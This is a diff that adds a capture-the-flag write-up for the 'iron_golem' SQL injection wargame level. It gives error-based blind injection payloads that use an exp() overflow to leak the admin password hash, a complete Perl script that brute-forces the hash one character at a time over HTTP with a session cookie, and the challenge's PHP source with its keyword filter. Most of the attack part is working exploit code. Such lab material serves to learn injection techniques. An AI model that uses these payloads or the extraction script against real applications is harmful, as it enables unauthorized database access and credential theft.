@@ -1,0 +1,70 @@
+check pw length : select id from prob_iron_golem where id='admin' and
+pw='pw='||id='admin' and IF(LENGTH(pw)=X,1234567890*9876543210,0)# and ''
+
+=> 32.
+
+Hmm. MD5.
+
+brute query : select id from prob_iron_golem where id='admin' and
+pw='pw='||id='admin' and IF(ORD(MID(pw,1,1))=X,exp(1234567890*9876543210),0)# and ''
+
+brute using 21_iron_golem.pl:
+
+==============================================================================
+
+#!/usr/bin/perl
+use strict;
+use warnings;
+use HTTP::Tiny;
+
+my $URL = "...";
+my $PWD;
+my @CHARS = (
+  (48 .. 57), # 0-9
+  (97 .. 102) # a-f
+);
+
+for my $POS (1 .. 32) {
+  for my $ORD (@CHARS) {
+    my $r = HTTP::Tiny->new->get(
+      "$URL?pw=%27%7C%7Cid=%27admin%27%20and%20IF(ORD(MID(pw,$POS,1))=$ORD"
+      .",exp(1234567890*1234567890),1)%23%20and%20%27",
+      {
+        headers => {
+          "Cookie" => "PHPSESSID=...",
+        },
+      }
+    );
+
+    if (length $r->{content} == 64) {
+      $PWD .= chr($ORD);
+      print "$POS => $ORD\n";
+      print "$PWD\n";
+      last;
+    }
+  }
+}
+
+# End of file
+
+==============================================================================
+
+IRON_GOLEM Clear!
+http://www.wechall.net
+<?php
+  include "./config.php"; 
+  login_chk(); 
+  $db = dbconnect(); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
+  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(mysqli_error($db)) exit(mysqli_error($db));
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  
+  $_GET[pw] = addslashes($_GET[pw]);
+  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
+  highlight_file(__FILE__);
+?>
